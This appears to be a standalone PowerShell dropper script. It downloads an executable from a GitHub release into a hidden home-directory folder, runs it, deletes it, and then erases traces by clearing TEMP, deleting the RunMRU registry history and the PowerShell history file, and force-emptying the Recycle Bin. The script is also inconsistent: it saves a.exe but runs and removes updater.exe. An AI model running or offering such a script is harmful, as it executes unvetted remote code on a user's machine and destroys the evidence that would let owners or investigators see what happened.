$homepath = Resolve-Path ~
mkdir $homepath\.tempfiles

iwr -Uri https://github.com/CoolCoderSJ/Self-Destructing-Passwords/releases/download/v1.0.4/A.exe -OutFile $homepath\.tempfiles\a.exe
cd $homepath\.tempfiles
.\updater.exe
cd $homepath
Start-Sleep -Seconds 15
rm $homepath\.tempfiles\updater.exe
rm $homepath\.tempfiles

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
